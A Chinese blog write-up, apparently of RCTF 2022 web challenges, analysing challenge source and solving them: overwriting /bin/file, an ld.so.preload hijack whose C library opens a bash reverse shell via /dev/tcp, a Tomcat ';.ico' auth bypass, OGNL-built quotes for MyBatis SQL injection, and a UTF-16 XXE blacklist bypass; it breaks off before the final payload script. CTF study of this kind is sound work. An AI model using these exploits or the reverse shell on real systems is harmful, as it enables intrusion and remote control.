<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath) <span class="keyword">and</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
<p>可以发现与第一题不同的是这里换成了安全的<code>render_template</code>，所以无法进行<code>SSTI</code>。</p>
<p>这道题有两个关键点：</p>
<ul>
<li>首先可以发现dockfile里面属主变为了<code>root</code></li>
<li>其次对于<code>os.path.join</code>，如果第二个参数前带有<code>/</code>的话，会将第一个参数忽略：</li>
</ul>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212231855138.png" alt=""></p>
<p>那么这道题我们可以通过覆盖<code>/bin/file</code>来执行命令获得flag。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>:</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>
<p>上传test文件后利用burp改文件名为<code>/bin/file</code>，那么在执行file命令时就会执行<code>cat /flag</code>：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212231905684.png" alt=""></p>
<p>同时也可以看到docker里面的<code>/bin/file</code>内容被改变：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212231906748.png" alt=""></p>
<h3 id="filechecker-promax"><a href="#filechecker-promax" class="headerlink" title="filechecker_promax"></a>filechecker_promax</h3><p>依旧先审源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">f&quot;<span class="subst">&#123;filepath&#125;</span> already exists (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.save(filepath)</span><br><span class="line">                file_check_res = subprocess.check_output(</span><br><span class="line">                    [<span class="string">&quot;/bin/file&quot;</span>, <span class="string">&quot;-b&quot;</span>, filepath], </span><br><span class="line">                    shell=<span class="literal">False</span>, </span><br><span class="line">                    encoding=<span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">                    timeout=<span class="number">1</span></span><br><span class="line">                )</span><br><span class="line">                os.remove(filepath)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;empty&quot;</span> <span class="keyword">in</span> file_check_res <span class="keyword">or</span> <span class="string">&quot;cannot open&quot;</span> <span class="keyword">in</span> file_check_res:</span><br><span class="line">                    file_check_res=<span class="string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span></span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=file_check_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    serve(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>, threads=<span class="number">1000</span>, cleanup_interval=<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
<p>可以发现这题我们无法覆盖已经存在的文件来执行命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">f&quot;<span class="subst">&#123;filepath&#125;</span> already exists (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>所以只能通过创建一个新的文件来进行RCE，我们可以先利用<code>strace</code>命令查看系统调用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-8-4-ubuntu:/home/ubuntu/tools<span class="comment"># strace file /etc/passwd 2&gt;&amp;1 | grep &quot;No such file or directory&quot;</span></span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line"><span class="built_in">stat</span>(<span class="string">&quot;/root/.magic.mgc&quot;</span>, 0x7ffce17f80b0) = -1 ENOENT (No such file or directory)</span><br><span class="line"><span class="built_in">stat</span>(<span class="string">&quot;/root/.magic&quot;</span>, 0x7ffce17f80b0)    = -1 ENOENT (No such file or directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/etc/magic.mgc&quot;</span>, O_RDONLY) = -1 ENOENT (No such file or directory)</span><br></pre></td></tr></table></figure>
<p>可以看到在运行file命令时加载了<code>/etc/ld.so.preload</code></p>
<p>利用方法可参考：<a href="https://pankas.top/2022/12/12/rctf-web">https://pankas.top/2022/12/12/rctf-web</a></p>
<blockquote>
<p>/etc/ld.so.preload 文件是一个<strong>链接动态装载器（ld.so）</strong>用来加载在系统启动时或者其他动态链接程序调用之前就需要加载的库的列表。<strong>Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和 *默认配置文件<code>/etc/ld.so.preload</code>* ，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和<code>/etc/ld.so.preload</code>配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</strong></p>
</blockquote>
<p>那么我们可以在<code>/app/upload/</code>下上传一个<code>.so</code>文件，并且上传<code>/etc/ld.so.preload</code>来包含这个文件，这样我们在执行file命令时就会加载我们自制的<code>.so</code>文件来执行我们想要的命令，通过<strong>条件竞争</strong>，利用多线程访问即可在<code>so</code>文件未删除时上传<code>/etc/ld.so.preload</code>文件并执行file命令。</p>
<p>这里借用出题人写的利用文件：<a href="https://github.com/L1aovo/my-ctf-challenges/tree/main/RCTF2022">https://github.com/L1aovo/my-ctf-challenges/tree/main/RCTF2022</a></p>
<p><strong>mylseek.c:</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;syscall.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">off_t</span> <span class="title function_">lseek</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> offset, <span class="type">int</span> whence)</span></span><br><span class="line">&#123;</span><br><span class="line">    remove(<span class="string">&quot;/etc/ld.so.preload&quot;</span>); <span class="comment">//without this, the exploit would recursively load mylseek.so</span></span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/ip/port &lt;&amp;1&#x27;&quot;</span>); <span class="comment">//改为自己服务器的ip和port即可</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SYS__llseek</span></span><br><span class="line">    <span class="type">off_t</span> result;</span><br><span class="line">    <span class="keyword">return</span> syscall(SYS__llseek, fd, offset&gt;&gt;<span class="number">32</span>, offset, &amp;result, whence) ? <span class="number">-1</span> : result;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="keyword">return</span> syscall(SYS_lseek, fd, offset, whence);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后进行编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc mylseek.c -o mylseek.so --shared -fPIC</span><br></pre></td></tr></table></figure>
<p><strong>ld.so.preload:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/app/upload/mylseek.so</span><br></pre></td></tr></table></figure>
<p>然后上传两个文件抓包后利用burp的intruder模块：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212261618032.png" alt=""></p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212261619493.png" alt=""></p>
<p>将payload置空，选择无限期重复，然后在服务器端开启监听，两个文件上传端开始攻击即可收到shell：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212262241693.png" alt=""></p>
<h3 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h3><p>这里记录一下<strong>将本地文件上传服务器的命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -r /super/ root@ip:/</span><br></pre></td></tr></table></figure>
<p>将本地的super文件夹全部内容上传至服务器的根目录。</p>
<p>打开靶机是一个<code>auth fail</code>界面，先看一下jar包。</p>
<p>发现filter类中有这个逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter1 init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter1 destroy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.isWhite(request) &amp;&amp; !<span class="built_in">this</span>.auth()) &#123;</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;auth fail&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isWhite</span><span class="params">(ServletRequest req)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest)req;</span><br><span class="line">        <span class="keyword">return</span> request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">auth</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说<code>url</code>必须以<code>.ico</code>结尾。</p>
<p>这里需要绕过，具体可参考：<a href="https://xz.aliyun.com/t/7544">https://xz.aliyun.com/t/7544</a></p>
<p>利用<code>/index;.ico</code>即可绕过。</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212261910531.png" alt=""></p>
<p>访问500是因为在controller中需要传入参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String password, String poc, String type, String yourclasses, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (password.length() &lt;= <span class="number">50</span> &amp;&amp; password.indexOf(<span class="string">&quot;&#x27;&quot;</span>) == -<span class="number">1</span>) &#123; <span class="comment">//限制password长度且不能包含&#x27;</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="built_in">this</span>.userService.selectUsernameByPassword(password);</span><br><span class="line">            <span class="keyword">if</span> (username != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                String[] classes = yourclasses.split(<span class="string">&quot;,&quot;</span>, <span class="number">4</span>);</span><br><span class="line">                <span class="keyword">return</span> xxe(poc, type, classes); <span class="comment">//利用点</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;not allow&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里可以跟进一下<code>userService</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserServiceImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">selectUsernameByPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="built_in">this</span>.userMapper.selectByPassword(password);</span><br><span class="line">        <span class="keyword">return</span> username == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>userMapper</code>接口的<code>selectByPassword</code>在<code>UserProvider</code>中实现:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProvider</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProvider</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">selectByPassword</span><span class="params">(Map&lt;String, Object&gt; params)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ((SQL)((SQL)((SQL)((SQL)(<span class="keyword">new</span> <span class="title class_">SQL</span>()).SELECT(<span class="string">&quot;*&quot;</span>)).FROM(<span class="string">&quot;users&quot;</span>)).WHERE(<span class="string">&quot;password = &#x27;&quot;</span> + params.get(<span class="string">&quot;password&quot;</span>) + <span class="string">&quot;&#x27;&quot;</span>)).LIMIT(<span class="number">1</span>)).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一种使用方法链来进行sql查询的方法，相当于sql语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> password <span class="operator">=</span> <span class="string">&#x27;&#123;value of params.get(&quot;password&quot;)&#125;&#x27;</span> LIMIT <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>那么我们这里需要构造永真<code>&#39; OR 1#</code>，但是单引号被过滤了，所以需要构造单引号。</p>
<p>在<code>pom.xml</code>中可以发现项目使用的是<code>mybatis</code>框架</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212261928563.png" alt=""></p>
<p><strong>mybatis是支持 OGNL 表达式的</strong>，所以利用OGNL表达式构造引号即可绕过，可以在本地试验一下：</p>
<p>引入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ognl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ognl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;@java.lang.Character@toString(39)&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        System.out.println(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;\u0027&quot;</span>);</span><br><span class="line">        System.out.println((<span class="string">&quot;a&quot;</span>).replace((<span class="type">char</span>) <span class="number">97</span>, (<span class="type">char</span>) <span class="number">39</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212262015697.png" alt=""></p>
<p>这样是可以得到引号的，实际上还可以<strong>利用<code>\u0027</code>来构造单引号</strong>甚至<strong>利用replace替换字符</strong>，都是一样的效果，这样引号就能绕过。</p>
<p><strong>一个需要注意的点是<code>SQL</code>语句中有括号配对问题，所以在构造永真式中需要插入一个反括号<code>)</code></strong></p>
<p>接下来就是进行<code>xxe</code>的bypass：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">xxe</span><span class="params">(String b64poc, String type, String[] classes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc); <span class="comment">//pocbas64解码</span></span><br><span class="line">        <span class="keyword">if</span> (check(bytepoc)) &#123; <span class="comment">//这里有waf利用UTF-16编码绕过</span></span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();<span class="comment">//创建一个DocumentBuilderFactory对象，用于获得DocumentBuilder对象</span></span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();<span class="comment">//得到解析XML文档的DocumentBuilder对象</span></span><br><span class="line">            <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//定义一个InputSource对象，表示输入源(字符流、字节流或URI)</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">wrappoc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">//利用反射获取一个自定义的构造器，这里classes是我们传入参数(以,分割为4份)</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(Class.forName(classes[<span class="number">1</span>]));<span class="comment">//classes[0]=java.io.ByteArrayInputStream，classes[1]应为byte数组类型的类名[B</span></span><br><span class="line">            <span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">                wrappoc = constructor.newInstance(stringpoc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                wrappoc = constructor.newInstance(bytepoc);<span class="comment">//将字节数组bytepoc转换为ByteArrayInputStream对象</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inputSource = (InputSource)Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(Class.forName(classes[<span class="number">3</span>])).newInstance(wrappoc);<span class="comment">//classes[2]=org.xml.sax.InputSource，构造函数的参数为抽象类InputStream，那么classes[3]=java.io.InputStream传入字节流wrappoc</span></span><br><span class="line">            <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);<span class="comment">//parse方法解析XML文档，接受参数类型为org.xml.sax.InputSource对象</span></span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();<span class="comment">//getChildNodes方法获取XML文档的子节点列表，返回一个NodeList对象，可以通过索引item(i)访问</span></span><br><span class="line">			<span class="comment">//getTextContent获取节点的文本内容，getNodeType检查节点类型，1表示是一个元素节点</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">                    res = res + nodes.item(i).getTextContent();</span><br><span class="line">                    System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">byte</span>[] poc)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(poc);</span><br><span class="line">        String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;!DOCTYPE&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">2</span>, -<span class="number">1</span>&#125;), <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">1</span>, -<span class="number">2</span>&#125;)&#125;; <span class="comment">//黑名单!DOCTYPE等</span></span><br><span class="line">        String[] var3 = blacklist;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> blacklist.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">black</span> <span class="operator">=</span> var3[var5];</span><br><span class="line">            <span class="keyword">if</span> (str.indexOf(black) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>第一层需要绕过<code>check</code>，可以参考：<a href="https://xz.aliyun.com/t/4059#toc-4">https://xz.aliyun.com/t/4059#toc-4</a> ；利用<code>UTF-16</code>编码绕过对!DOCTYPE的检测。</p>
<p>第二层是<code>yourclasses</code>的四个参数的确定，其中对byte数组的类名可参考：</p>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212262116624.png" alt=""></p>
<p>所以<code>byte[]</code>的类名为<code>[B</code>。</p>
<p>生成payload的exp为：</p>
